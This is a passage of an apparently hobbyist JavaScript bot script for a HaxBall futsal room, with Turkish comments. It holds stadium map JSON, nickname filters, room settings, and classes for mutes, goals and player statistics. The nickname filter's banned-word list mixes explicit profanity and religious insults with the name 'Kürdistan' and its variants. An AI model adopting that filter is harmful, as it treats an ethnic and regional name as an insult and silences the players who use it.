t":"line","cMask":["ball"],"bCoef":1},{"x":-674,"y":290,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":674,"y":80,"trait":"line","cMask":["ball"],"bCoef":1},{"x":674,"y":290,"trait":"ballArea","cMask":["ball"],"bCoef":1}],"segments":[{"v0":0,"v1":1,"trait":"ballArea"},{"v0":2,"v1":3,"trait":"ballArea"},{"v0":4,"v1":5,"trait":"ballArea"},{"v0":6,"v1":7,"trait":"ballArea"},{"v0":8,"v1":9,"trait":"kickOffBarrier"},{"v0":9,"v1":10,"trait":"kickOffBarrier","curve":180,"cGroup":["blueKO"]},{"v0":9,"v1":10,"trait":"kickOffBarrier","curve":-180,"cGroup":["redKO"]},{"v0":10,"v1":11,"trait":"kickOffBarrier"},{"vis":true,"bCoef":0.1,"cMask":["ball"],"trait":"goalNet","v0":2,"v1":12,"color":"FFFFFF","curve":-35},{"vis":true,"bCoef":0.1,"cMask":["ball"],"trait":"goalNet","v0":6,"v1":13,"color":"FFFFFF","curve":35},{"vis":true,"bCoef":0.1,"cMask":["ball"],"trait":"goalNet","v0":1,"v1":14,"color":"FFFFFF","curve":35},{"vis":true,"bCoef":0.1,"cMask":["ball"],"trait":"goalNet","v0":5,"v1":15,"color":"FFFFFF","curve":-35},{"vis":true,"bCoef":0.1,"cMask":["ball"],"trait":"goalNet","v0":12,"v1":14,"x":-585,"color":"FFFFFF","curve":-35},{"vis":true,"bCoef":0.1,"cMask":["ball"],"trait":"goalNet","v0":13,"v1":15,"x":585,"color":"FFFFFF","curve":35},{"color":"FFFFFF","trait":"line","v0":16,"v1":17,"curve":90},{"color":"FFFFFF","trait":"line","v0":18,"v1":19,"curve":-90},{"color":"FFFFFF","trait":"line","v0":20,"v1":21,"curve":-90},{"color":"FFFFFF","trait":"line","v0":22,"v1":23,"curve":90},{"vis":true,"color":"FFFFFF","bCoef":0,"trait":"line","v0":17,"v1":21,"curve":0},{"vis":true,"color":"FFFFFF","bCoef":0,"trait":"line","v0":19,"v1":23,"curve":0},{"vis":true,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":1,"v1":0,"cMask":["ball"],"x":-665},{"vis":true,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":5,"v1":4,"cMask":["ball"],"x":665},{"vis":true,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":2,"v1":3,"cMask":["ball"],"x":-665},{"vis":true,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":6,"v1":7,"cMask":["ball"],"x":665},{"vis":true,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":0,"v1":24,"y":290},{"vis":true,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":3,"v1":25,"y":-290},{"curve":0,"vis":true,"color":"FFFFFF","bCoef":0,"trait":"line","v0":26,"v1":27},{"curve":-180,"vis":true,"color":"FFFFFF","bCoef":0,"trait":"line","v0":10,"v1":9},{"curve":180,"vis":true,"color":"FFFFFF","bCoef":0,"trait":"line","v0":29,"v1":28},{"curve":0,"vis":true,"color":"FFFFFF","bCoef":0,"trait":"line","v0":2,"v1":1},{"curve":0,"vis":true,"color":"FFFFFF","bCoef":0,"trait":"line","v0":6,"v1":5},{"vis":false,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":30,"v1":31,"cMask":["ball"],"x":614},{"vis":false,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":32,"v1":33,"cMask":["ball"],"x":-614},{"vis":false,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":34,"v1":35,"cMask":["ball"],"x":-614},{"vis":false,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":36,"v1":37,"cMask":["ball"],"x":614}],"goals":[{"p0":[-674,-80],"p1":[-674,80],"team":"red"},{"p0":[674,80],"p1":[674,-80],"team":"blue"}],"discs":[{"pos":[-665,80],"trait":"goalPost","color":"FFFFFF","radius":5},{"pos":[-665,-80],"trait":"goalPost","color":"FFFFFF","radius":5},{"pos":[665,80],"trait":"goalPost","color":"FFFFFF","radius":5},{"pos":[665,-80],"trait":"goalPost","color":"FFFFFF","radius":5}],"planes":[{"normal":[0,1],"dist":-290,"trait":"ballArea"},{"normal":[0,-1],"dist":-290,"trait":"ballArea"},{"normal":[0,1],"dist":-339,"bCoef":0.2,"cMask":["all"]},{"normal":[0,-1],"dist":-339,"bCoef":0.2,"cMask":["all"]},{"normal":[1,0],"dist":-755,"bCoef":0.2,"cMask":["all"]},{"normal":[-1,0],"dist":-755,"bCoef":0.2,"cMask":["all"]}],"traits":{"ballArea":{"vis":false,"bCoef":1,"cMask":["ball"]},"goalPost":{"radius":8,"invMass":0,"bCoef":1},"goalNet":{"vis":true,"bCoef":0.1,"cMask":["all"]},"kickOffBarrier":{"vis":false,"bCoef":0.1,"cGroup":["redKO","blueKO"],"cMask":["red","blue"]},"line":{"vis":true,"bCoef":0,"cMask":[""]},"arco":{"radius":2,"cMask":["n\/d"],"color":"cccccc"}},"playerPhysics":{"acceleration":0.11,"kickingAcceleration":0.1,"kickStrength":7},"ballPhysics":{"radius":6.4,"color":"EAFF00"}}';

const trainingMap = '{"name":"ACEMİ FUTSALI HARİTASI","width":1080,"height":532,"bg": { "type": "", "width": 0, "height": 0, "color": "303030" },"vertexes":[{"x":-950,"y":460,"cMask":["ball"]},{"x":-950,"y":90,"cMask":["ball"]},{"x":-950,"y":-90,"cMask":["ball"]},{"x":-950,"y":-460,"cMask":["ball"]},{"x":950,"y":456,"cMask":["ball"]},{"x":950,"y":90,"cMask":["ball"]},{"x":950,"y":-90,"cMask":["ball"]},{"x":950,"y":-456,"cMask":["ball"]},{"x":0,"y":508,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"]},{"x":0,"y":150,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"]},{"x":0,"y":-150,"bCoef":0,"cMask":[]},{"x":0,"y":-508,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"]},{"x":-995,"y":-90,"bCoef":0.1,"cMask":["ball"]},{"x":995,"y":-90,"bCoef":0.1,"cMask":["ball"]},{"x":-995,"y":90,"bCoef":0.1,"cMask":["ball"]},{"x":995,"y":90,"bCoef":0.1,"cMask":["ball"]},{"x":951,"y":460,"cMask":["ball"]},{"x":951,"y":-460,"cMask":["ball"]},{"x":0,"y":460,"bCoef":0,"cMask":[]},{"x":0,"y":-460,"bCoef":0,"cMask":[]},{"x":0,"y":150,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"]},{"x":0,"y":-150,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"]},{"x":958,"y":-90,"cMask":["ball"]},{"x":958,"y":-456,"cMask":["ball"]},{"x":-958,"y":-90,"cMask":["ball"]},{"x":-958,"y":-456,"cMask":["ball"]},{"x":-958,"y":90,"cMask":["ball"]},{"x":-958,"y":456,"cMask":["ball"]},{"x":958,"y":90,"cMask":["ball"]},{"x":958,"y":456,"cMask":["ball"]},{"x":0,"y":-9,"bCoef":0,"cMask":[]},{"x":0,"y":9,"bCoef":0,"cMask":[]},{"x":0,"y":-9,"bCoef":0,"cMask":[]},{"x":0,"y":9,"bCoef":0,"cMask":[]},{"x":634.21528583524,"y":-109.20953737271,"bCoef":0,"cMask":[]},{"x":634.21528583524,"y":114.16613046747,"bCoef":0,"cMask":[]},{"x":634.21528583524,"y":114.16613046747,"bCoef":0,"cMask":[]},{"x":950,"y":324.62551819445,"bCoef":0,"cMask":[]},{"x":634.21528583524,"y":-109.20953737271,"bCoef":0,"cMask":[]},{"x":634.35340467604,"y":4.2212921610516,"bCoef":0.1,"cMask":[]},{"x":634.35340467604,"y":1.7712285482462,"bCoef":0.1,"cMask":[]},{"x":634.35340467604,"y":6.6713557738571,"bCoef":0.1,"cMask":[]},{"x":634.35340467604,"y":-0.67883506455928,"bCoef":0.1,"cMask":[]},{"x":634.35340467604,"y":0.54619674184346,"bCoef":0.1,"cMask":[]},{"x":634.35340467604,"y":5.4463239674544,"bCoef":0.1,"cMask":[]},{"x":634.35340467604,"y":-1.2913509677606,"bCoef":0.1,"cMask":[]},{"x":634.35340467604,"y":7.2838716770584,"bCoef":0.1,"cMask":[]},{"x":-950,"y":432.90041943973,"bCoef":0.1,"cMask":[]},{"x":-926.21802170761,"y":460,"bCoef":0.1,"cMask":[]},{"x":-950,"y":-433.32499678239,"bCoef":0.1,"cMask":[]},{"x":-925.43621788149,"y":-460,"bCoef":0.1,"cMask":[]},{"x":950,"y":-433.36622514797,"bCoef":0.1,"cMask":[]},{"x":927.73220749769,"y":-460,"bCoef":0.1,"cMask":[]},{"x":950,"y":434.55334331787,"bCoef":0.1,"cMask":[]},{"x":925.51401132381,"y":460,"bCoef":0.1,"cMask":[]},{"x":950,"y":-319.66892509968,"bCoef":0,"cMask":[]},{"x":-635.67083595539,"y":111.16613046747,"bCoef":0,"cMask":[]},{"x":-635.67083595539,"y":-112.20953737271,"bCoef":0,"cMask":[]},{"x":-950,"y":-322.66892509968,"bCoef":0,"cMask":[]},{"x":-635.82253673536,"y":-2.314063297901,"bCoef":0.1,"cMask":[]},{"x":-635.83851134042,"y":0.13595112921681,"bCoef":0.1,"cMask":[]},{"x":-635.80656213031,"y":-4.764077725019,"bCoef":0.1,"cMask":[]},{"x":-635.85448594547,"y":2.5859655563347,"bCoef":0.1,"cMask":[]},{"x":-635.84649864294,"y":1.3609583427757,"bCoef":0.1,"cMask":[]},{"x":-635.81454943284,"y":-3.53907051146,"bCoef":0.1,"cMask":[]},{"x":-635.85847959673,"y":3.1984691631142,"bCoef":0.1,"cMask":[]},{"x":-635.80256847905,"y":-5.3765813317984,"bCoef":0.1,"cMask":[]},{"x":-950,"y":321.62551819445,"bCoef":0,"cMask":[]},{"x":-0.077614373673782,"y":-2.4626457981722,"bCoef":0.1,"cMask":[]},{"x":-0.10499941090626,"y":2.3835365851378,"bCoef":0.1,"cMask":[]},{"x":-0.050229336441873,"y":-7.3088281814824,"bCoef":0.1,"cMask":[]},{"x":-0.13238444813857,"y":7.2297189684479,"bCoef":0.1,"cMask":[]},{"x":-0.11869192952281,"y":4.8066277767929,"bCoef":0.1,"cMask":[]},{"x":-0.063921855057799,"y":-4.8857369898273,"bCoef":0.1,"cMask":[]},{"x":-0.13923070744664,"y":8.4412645642754,"bCoef":0.1,"cMask":[]},{"x":-0.043383077133171,"y":-8.5203737773099,"bCoef":0.1,"cMask":[]},{"x":0.77952848346911,"y":1.5373542018278,"bCoef":0.1,"cMask":[]},{"x":2.7521434462366,"y":3.3835365851378,"bCoef":0.1,"cMask":[]},{"x":0.80691352070102,"y":-3.3088281814824,"bCoef":0.1,"cMask":[]},{"x":1.7247584090043,"y":2.2297189684479,"bCoef":0.1,"cMask":[]},{"x":2.73845092762,"y":5.8066277767929,"bCoef":0.1,"cMask":[]},{"x":0.79322100208503,"y":-0.88573698982727,"bCoef":0.1,"cMask":[]},{"x":1.7179121496962,"y":3.4412645642754,"bCoef":0.1,"cMask":[]},{"x":0.81375978000966,"y":-4.5203737773099,"bCoef":0.1,"cMask":[]},{"x":-950,"y":-322.66892509968,"bCoef":0,"cMask":[]},{"x":-950,"y":321.62551819445,"bCoef":0,"cMask":[]},{"x":-635.67083595539,"y":111.16613046747,"bCoef":0,"cMask":[]},{"x":-950,"y":321.62551819445,"bCoef":0,"cMask":[]},{"x":-635.67083595539,"y":-112.20953737271,"bCoef":0,"cMask":[]},{"x":-950,"y":-322.66892509968,"bCoef":0,"cMask":[]}],"segments":[{"v0":0,"v1":1,"vis":false,"cMask":["ball"]},{"v0":2,"v1":3,"vis":false,"cMask":["ball"]},{"v0":4,"v1":5,"vis":false,"cMask":["ball"]},{"v0":6,"v1":7,"vis":false,"cMask":["ball"]},{"v0":8,"v1":9,"vis":false,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"]},{"v0":9,"v1":10,"curve":180,"vis":false,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["blueKO"],"curveF":6.123233995736766e-17},{"v0":10,"v1":9,"curve":180,"vis":false,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO"],"curveF":6.123233995736766e-17},{"v0":10,"v1":11,"vis":false,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"]},{"v0":2,"v1":12,"color":"FFFFFF","bCoef":0.1,"cMask":["ball"]},{"v0":6,"v1":13,"color":"FFFFFF","bCoef":0.1,"cMask":["ball"]},{"v0":1,"v1":14,"color":"FFFFFF","bCoef":0.1,"cMask":["ball"]},{"v0":5,"v1":15,"color":"FFFFFF","bCoef":0.1,"cMask":["ball"]},{"v0":12,"v1":14,"color":"FFFFFF","bCoef":0.1,"cMask":["ball"]},{"v0":13,"v1":15,"color":"FFFFFF","bCoef":0.1,"cMask":["ball"]},{"v0":1,"v1":0,"color":"FFFFFF","cMask":["ball"]},{"v0":5,"v1":4,"color":"FFFFFF","cMask":["ball"]},{"v0":2,"v1":3,"color":"FFFFFF","cMask":["ball"]},{"v0":6,"v1":7,"color":"FFFFFF","cMask":["ball"]},{"v0":0,"v1":16,"color":"FFFFFF","cMask":["ball"]},{"v0":3,"v1":17,"color":"FFFFFF","cMask":["ball"]},{"v0":18,"v1":19,"color":"FFFFFF","bCoef":0,"cMask":[]},{"v0":9,"v1":10,"curve":180,"color":"FFFFFF","bCoef":0,"cMask":[],"curveF":6.123233995736766e-17},{"v0":21,"v1":20,"curve":180,"color":"FFFFFF","bCoef":0,"cMask":[],"curveF":6.123233995736766e-17},{"v0":2,"v1":1,"color":"FFFFFF","bCoef":0,"cMask":[]},{"v0":6,"v1":5,"color":"FFFFFF","bCoef":0,"cMask":[]},{"v0":22,"v1":23,"vis":false,"color":"FFFFFF","cMask":["ball"]},{"v0":24,"v1":25,"vis":false,"color":"FFFFFF","cMask":["ball"]},{"v0":26,"v1":27,"vis":false,"color":"FFFFFF","cMask":["ball"]},{"v0":28,"v1":29,"vis":false,"color":"FFFFFF","cMask":["ball"]},{"v0":31,"v1":30,"curve":180,"color":"FFFFFF","bCoef":0,"cMask":[],"curveF":6.123233995736766e-17},{"v0":32,"v1":33,"curve":180,"color":"FFFFFF","bCoef":0,"cMask":[],"curveF":6.123233995736766e-17},{"v0":34,"v1":35,"color":"F8F8F8","bCoef":0,"cMask":[]},{"v0":37,"v1":36,"curve":89.99999999999999,"color":"F8F8F8","bCoef":0,"cMask":[],"curveF":1.0000000000000002},{"v0":40,"v1":39,"curve":-179.99999999985,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-1.3091137582980271e-12},{"v0":39,"v1":40,"curve":-179.99999999989004,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-9.59837594750953e-13},{"v0":42,"v1":41,"curve":179.99999999999,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":8.732476207549468e-14},{"v0":41,"v1":42,"curve":-179.99999999999002,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-8.720229739557994e-14},{"v0":44,"v1":43,"curve":-179.99999999994003,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-5.235199460732664e-13},{"v0":43,"v1":44,"curve":-179.99999999999002,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-8.720229739557994e-14},{"v0":46,"v1":45,"curve":179.99999999999,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":8.732476207549468e-14},{"v0":45,"v1":46,"curve":179.99999999999,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":8.732476207549468e-14},{"v0":47,"v1":48,"curve":91.636910923379,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.9718309859154628},{"v0":50,"v1":49,"curve":91.636910923384,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.9718309859153781},{"v0":51,"v1":52,"curve":91.636910923386,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.9718309859153441},{"v0":54,"v1":53,"curve":91.636910923367,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.9718309859156665},{"v0":38,"v1":55,"curve":89.99999999999999,"color":"F8F8F8","bCoef":0,"cMask":[],"curveF":1.0000000000000002},{"v0":56,"v1":57,"color":"F8F8F8","bCoef":0,"cMask":[]},{"v0":60,"v1":59,"curve":-179.95850096528002,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-0.00036214741196362337},{"v0":59,"v1":60,"curve":-179.95850096552002,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-0.0003621474098692984},{"v0":62,"v1":61,"curve":-179.95850096539,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-0.0003621474110039465},{"v0":61,"v1":62,"curve":-179.95850096543003,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-0.00036214741065467026},{"v0":64,"v1":63,"curve":-179.95850096540002,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-0.0003621474109164609},{"v0":63,"v1":64,"curve":-179.95850096542003,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-0.0003621474107419338},{"v0":66,"v1":65,"curve":-179.95850096542003,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-0.0003621474107419338},{"v0":65,"v1":66,"curve":-179.95850096540002,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-0.0003621474109164609},{"v0":69,"v1":68,"curve":179.83332296199,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325761397712},{"v0":68,"v1":69,"curve":179.8333229623,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.001454532573434374},{"v0":71,"v1":70,"curve":179.83332296215,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325747435517},{"v0":70,"v1":71,"curve":179.8333229621,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325751798702},{"v0":73,"v1":72,"curve":179.83332296204,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325757034527},{"v0":72,"v1":73,"curve":179.83332296211,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325750926065},{"v0":75,"v1":74,"curve":179.8333229621,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325751798702},{"v0":74,"v1":75,"curve":179.83332296208,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325753543975},{"v0":77,"v1":76,"curve":179.83332296199,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325761397712},{"v0":76,"v1":77,"curve":179.8333229623,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.001454532573434374},{"v0":79,"v1":78,"curve":179.83332296215,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325747435517},{"v0":78,"v1":79,"curve":179.8333229621,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325751798702},{"v0":81,"v1":80,"curve":179.83332296204,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325757034527},{"v0":80,"v1":81,"curve":179.83332296211,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325750926065},{"v0":83,"v1":82,"curve":179.8333229621,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325751798702},{"v0":82,"v1":83,"curve":179.83332296208,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325753543975},{"v0":86,"v1":87,"curve":89.99999999999999,"color":"F8F8F8","bCoef":0,"cMask":[],"curveF":1.0000000000000002},{"v0":89,"v1":88,"curve":89.99999999999999,"color":"F8F8F8","bCoef":0,"cMask":[],"curveF":1.0000000000000002}],"planes":[{"normal":[0,1],"dist":-456,"cMask":["ball"]},{"normal":[0,-1],"dist":-456,"cMask":["ball"]},{"normal":[0,1],"dist":-508,"bCoef":0.2},{"normal":[0,-1],"dist":-508,"bCoef":0.2},{"normal":[1,0],"dist":-1002,"bCoef":0.2},{"normal":[-1,0],"dist":-1002,"bCoef":0.2}],"goals":[{"p0":[-957.4,-90],"p1":[-957.4,90],"team":"red"},{"p0":[957.4,90],"p1":[957.4,-90],"team":"blue"}],"discs":[{"radius":6.4,"invMass":1.5,"pos":[0,0],"color":"FFCC00","bCoef":0.4,"cGroup":["ball","kick","score"]},{"radius":5,"invMass":0,"pos":[-950,90],"color":"6666CC","bCoef":1},{"radius":5,"invMass":0,"pos":[-950,-90],"color":"6666CC","bCoef":1},{"radius":5,"invMass":0,"pos":[950,90],"color":"6666CC","bCoef":1},{"radius":5,"invMass":0,"pos":[950,-90],"color":"6666CC","bCoef":1},{"radius":3,"invMass":0,"pos":[-950,460],"color":"FFCC00","bCoef":0.1,"cMask":[]},{"radius":3,"invMass":0,"pos":[-950,-460],"color":"FFCC00","bCoef":0.1,"cMask":[]},{"radius":3,"invMass":0,"pos":[950,-460],"color":"FFCC00","bCoef":0.1,"cMask":[]},{"radius":3,"invMass":0,"pos":[950,460],"color":"FFCC00","bCoef":0.1,"cMask":[]}],"playerPhysics":{"bCoef":0,"acceleration":0.11,"kickingAcceleration":0.083},"ballPhysics":"disc0","spawnDistance":310,"traits":[],"joints":[],"redSpawnPoints":[],"blueSpawnPoints":[],"canBeStored":true}';

let maxKelimeLen = 60; // Maksimum karakter sınırı
let minKelimeLen = 2; // Minimum karakter sınırı

// Karalisteye alınmış olan kişilerin nickleri
const forbiddenkaraliste = ["Lioss", "Lios", "Lıoss", "lioss"];

// Nickte bulunulması yasaklanılmış karakterler, şekilli harfler
const forbiddenCarachters = ["𝐀", "𝑨", "𝒜", "𝓐", "𝔄", "𝔸", "𝕬", "𝖠", "𝗔", "𝘈", "𝘼", "𝙰", "𝚨", "𝐚", "𝑎", "𝒂", "𝓪", "𝔞", "𝕒", "𝖆", "𝖺", "𝗮", "𝘢", "𝙖", "𝚊", "я", "т", "𝓻", "𝓽", "r͙", "r̽", "◢", "❁", "♥", "У", "β", "✿", "α", "´", "°", "つ", "∠", "︿", "⊙", "ヾ", "ں", "੭", "ఌ", "甈", "甈", "甈", "甈", "甈", "甈", "﷽", "﷽", "ൽ", "☆"];

// Nickte bulunulması yasaklanılmış emojiler
const forbiddenWords = ["🍕", "🎶", "📚", "🔥", "💻", "🏖️", "🌍", "🍦", "🎈", "🌻", "🚗", "📷", "✨", "🥳", "🍔", "🌮", "🎨", "🎲", "🎸", "🌊", "🌙", "🍩", "🏀", "⚽️", "🎾", "🚲", "📱", "🖋️", "🌳", "🍁", "🌸", "🌼", "🌞", "🦄", "🐾", "🍉", "🍭", "🍂", "🌅", "🎠", "🏰", "🚂", "🚀", "🌈", "🌟", "🐶", "🐱", "🐭", "🐹", "🐰", "🦊", "🐻", "🐼", "🐨", "🐯", "🦁", "🐮", "🐷", "🐸", "🐵", "🐔", "🐧", "🐦", "🐤", "🦆", "🦅", "🦉", "🦇", "🐺", "🐗", "🐴", "🐝", "🐛", "🦋", "🐌", "🐞", "🐜", "🦟", "🦗", "🕷️", "🦂", "🐢", "🐍", "🦎", "🦖", "🦕", "🐙", "🦑", "🦐", "🦞", "🦀", "🐡", "🐠", "🐟", "🐬", "🐳", "🐋", "🦈", "🐊", "🐅", "🐆", "🦓", "🦍", "🦧", "🐘", "🦛", "🦏", "🐪", "🐫", "🦒", "🦘", "🐃", "🐂", "🐄", "🐎", "🐖", "🐏", "🐑", "🦙", "🐐", "🦌", "🐕", "🐩", "🐈", "🐓", "🦃", "🦚", "🦜", "🦢", "🦩", "🕊️", "🐇", "🦝", "🦨", "🦡", "🦫", "🦦", "🦥", "🐁", "🐀", "🐿️", "🦔", "😄", "😊", "😎", "😍", "🥰", "😘", "😜", "🤪", "😇", "🤩", "🤗", "🤓", "😌", "🥳", "😋", "😇", "🤠", "🤡", "🥸", "😷", "🤕", "🤒", "🤢", "🤮", "🤧", "🥵", "🥶", "🥴", "😵", "🤯", "🤥", "🤫", "🤭", "🧐", "🤔", "🤨", "😐", "😑", "😶", "😏", "😒", "🙄", "😬", "🤥", "😔", "😪", "🤤", "😴", "😷", "🤕", "🤒", "🤢", "🤮", "🤧", "🥵", "🥶", "🥴", "😵", "🤯", "🥱", "😦", "😧", "😮", "😲", "🥺", "😕", "😟", "🙁", "☹️", "😣", "😖", "😫", "😩", "😤", "😠", "🤬", "😡", "😤", "😢", "😭", "😦", "😧", "😮", "😲", "🥱", "😟", "🙁", "☹️", "😖", "😣", "😫", "😩", "😭", "😤", "😠", "🤯", "🤬", "😡", "🤢", "🤮", "🤧", "🥵", "🥶", "🥴", "😵", "😷", "🤕", "🤒", "😶‍🌫️", "👍", "👎", "👆", "👇", "👈", "👉", "👋", "🤚", "🖐️", "🖖", "👌", "🤏", "✌️", "🤞", "🤟", "🤘", "🤙", "👈", "🤝", "🙏", "✍️", "💅", "🦾", "🦿", "🦵", "🦶", "👣", "👂", "🦻", "👃", "👁️", "👀", "🧠", "🦷", "🦴", "👅", "👄", "🫀", "🫁", "🫂", "💎", "👑", "🔱"];

// Nickte bulunulması yasaklanılmış küfürler
const forbiddenKufur = ["allahını", "atatürkünü", "peygamberini", "siktim", "sikerim", "sikicem", "sikecem", "sikeceğim", "amcık", "amıcık", "siktir", "sikiş", "sikmiş", "orospu", "orspu", "yarrak", "yarak", "göt", "pipi", "annen", "baban", "kürdistan", "kurdistan", "kürdıstan", "kurdıstan", "kuranını", "sex", "fuck", "bitch", "seks", "porn", "kuranı kerimi", "orosbu", "orusbu", "piç", "pezevenk", "ifşa", "sikici", "admin"];


room.setScoreLimit(scoreLimit);
room.setTimeLimit(timeLimit);
room.setTeamsLock(true);
room.setTeamColors(1, 70, 0xe2bd62, [0xe50029, 0x94001a, 0x321e20]); // red
room.setTeamColors(2, 113, 0xeaf8a1, [0x67c9ec, 0x07bdec, 0x008ac9]); // blue
room.setKickRateLimit(6, 0, 0);

var masterPassword = 10000 + getRandomInt(90000);
var roomPassword = '';

/* OPTIONS */

var drawTimeLimit = Infinity;
var teamSize = 6;
var maxAdmins = 0;
var disableBans = false;
var debugMode = false;
var afkLimit = debugMode ? Infinity : 16;

var defaultSlowMode = 0.5;
var chooseModeSlowMode = 1;
var slowMode = defaultSlowMode;
var SMSet = new Set();

var hideClaimMessage = true;
var mentionPlayersUnpause = true;

/* OBJECTS */

class Goal {
    constructor(time, team, striker, assist) {
        this.time = time;
        this.team = team;
        this.striker = striker;
        this.assist = assist;
    }
}

class Game {
    constructor() {
        this.date = Date.now();
        this.scores = room.getScores();
        this.playerComp = getStartingLineups();
        this.goals = [];
        this.rec = room.startRecording();
        this.touchArray = [];
    }
}

class PlayerComposition {
    constructor(player, auth, timeEntry, timeExit) {
        this.player = player;
        this.auth = auth;
        this.timeEntry = timeEntry;
        this.timeExit = timeExit;
        this.inactivityTicks = 0;
        this.GKTicks = 0;
    }
}

class MutePlayer {
    constructor(name, id, auth) {
        this.id = MutePlayer.incrementId();
        this.name = name;
        this.playerId = id;
        this.auth = auth;
        this.unmuteTimeout = null;
    }

    static incrementId() {
        if (!this.latestId) this.latestId = 1
        else this.latestId++
        return this.latestId
    }

    setDuration(minutes) {
        this.unmuteTimeout = setTimeout(() => {
            room.sendAnnouncement(
                `You have been unmuted.`,
                this.playerId,
                announcementColor,
                "bold",
                HaxNotification.CHAT
            );
            this.remove();
        }, minutes * 60 * 1000);
        muteArray.add(this);
    }

    remove() {
        this.unmuteTimeout = null;
        muteArray.removeById(this.id);
    }
}

class MuteList {
    constructor() {
        this.list = [];
    }

    add(mutePlayer) {
        this.list.push(mutePlayer);
        return mutePlayer;
    }

    getById(id) {
        var index = this.list.findIndex(mutePlayer => mutePlayer.id === id);
        if (index !== -1) {
            return this.list[index];
        }
        return null;
    }

    getByPlayerId(id) {
        var index = this.list.findIndex(mutePlayer => mutePlayer.playerId === id);
        if (index !== -1) {
            return this.list[index];
        }
        return null;
    }

    getByAuth(auth) {
        var index = this.list.findIndex(mutePlayer => mutePlayer.auth === auth);
        if (index !== -1) {
            return this.list[index];
        }
        return null;
    }

    removeById(id) {
        var index = this.list.findIndex(mutePlayer => mutePlayer.id === id);
        if (index !== -1) {
            this.list.splice(index, 1);
        }
    }

    removeByAuth(auth) {
        var index = this.list.findIndex(mutePlayer => mutePlayer.auth === auth);
        if (index !== -1) {
            this.list.splice(index, 1);
        }
    }
}

class BallTouch {
    constructor(player, time, goal, position) {
        this.player = player;
        this.time = time;
        this.goal = goal;
        this.position = position;
    }
}

class HaxStatistics {
    constructor(playerName = '') {
        this.playerName = playerName;
        this.games = 0;
        this.wins = 0;
        this.winrate = '0.00%';
        this.playtime = 0;
        this.goals = 0;
        this.assists = 0;
        this.CS = 0;
        this.ownGoals = 0;
    }
}

/* PLAYERS */

const Team = { SPECTATORS: 0, RED: 1, BLUE: 2 };
const State = { PLAY: 0, PAUSE: 1, STOP: 2 };
const Role = { PLAYER: 0, ADMIN_TEMP: 1, ADMIN_PERM: 2, MASTER: 3 };
const HaxNotification = { NONE: 0, CHAT: 1, MENTION: 2 };
const Situation = { STOP: 0, KICKOFF: 1, PLAY: 2, GOAL: 3 };

var gameState = State.STOP;
var playSituation = Situation.STOP;
var goldenGoal = false;

var playersAll = [];
var players = [];
var teamRed = [];
var teamBlue = [];
var teamSpec = [];

var teamRedStats = [];
var teamBlueStats = [];

var banList = [];

/* STATS */

var possession = [0, 0];
var actionZoneHalf = [0, 0];
var lastWinner = Team.SPECTATORS;
var streak = 0;

/* AUTH */

var authArray = [];
var adminList = [
    // ['INSERT_AUTH_HERE_1', 'NICK_OF_ADMIN_1'],
    // ['INSERT_AUTH_HERE_2', 'NICK_OF_ADMIN_2'],
];
var masterList = [
